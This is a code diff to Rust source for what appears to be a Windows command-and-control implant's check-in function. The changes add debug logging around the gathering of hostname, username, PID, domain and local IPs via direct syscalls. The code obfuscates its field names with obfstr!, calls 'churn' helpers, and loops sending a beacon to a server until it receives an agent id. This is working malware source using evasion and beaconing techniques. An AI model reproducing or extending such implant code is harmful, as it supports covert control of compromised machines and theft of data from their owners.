@@ -148,12 +148,27 @@ fn get_current_username_syscall_direct() -> Result<String, String> {
 }
 
 pub fn checkin() {
+    crate::dlog!("checkin: resolve host via syscall");
     let hostname = get_hostname_syscall()
         .or_else(|| std::env::var("COMPUTERNAME").ok())
         .unwrap_or_else(|| "Unknown".to_string());
+    crate::dlog!("checkin: hostname={hostname}");
 
-    let username = get_current_username_syscall_direct()
-        .unwrap_or_else(|_| std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string()));
+    crate::dlog!("checkin: resolve user via syscall");
+    let username = match get_current_username_syscall_direct() {
+        Ok(u) => {
+            crate::dlog!("checkin: username={u}");
+            u
+        }
+        Err(e) => {
+            crate::dlog!("checkin: username syscall failed: {e}");
+            std::env::var("USERNAME").unwrap_or_else(|_| "Unknown".to_string())
+        }
+    };
+
+    crate::dlog!("checkin: resolve pid via syscall");
+    let pid = get_pid_via_syscall();
+    crate::dlog!("checkin: pid={pid}");
 
     let ips: Vec<String> = std::net::UdpSocket::bind("0.0.0.0:0")
         .and_then(|s| { s.connect("8.8.8.8:80")?; s.local_addr() })
@@ -166,7 +181,7 @@ pub fn checkin() {
         obfstr!("os"): "windows",
         obfstr!("user"): username,
         obfstr!("host"): hostname,
-        obfstr!("pid"): get_pid_via_syscall(),
+        obfstr!("pid"): pid,
         obfstr!("architecture"): "x64",
         obfstr!("domain"): std::env::var("USERDOMAIN").unwrap_or_default(),
         obfstr!("ips"): ips,
@@ -182,17 +197,24 @@ pub fn checkin() {
     crate::helpers::churn(hostname.as_str());
     crate::helpers::churn(username.as_str());
 
+    let mut attempt: u32 = 0;
     loop {
+        attempt += 1;
+        crate::dlog!("checkin: post attempt={attempt}");
         match transport::send_request_with_response(&json_str) {
             Ok(resp) => {
                 if let Some(id) = resp.get("id").and_then(|v| v.as_str()) {
+                    crate::dlog!("checkin: success agent_id={id}");
                     crate::helpers::churn(id);
                     let mut uuid = config::UUID.write().unwrap();
                     *uuid = id.to_string();
                     return;
                 }
+                crate::dlog!("checkin: response missing id: {resp}");
             }
-            Err(_) => {}
+            Err(e) => {
+                crate::dlog!("checkin: transport err: {e}");
+            }
         }
         crate::helpers::idle();
     }
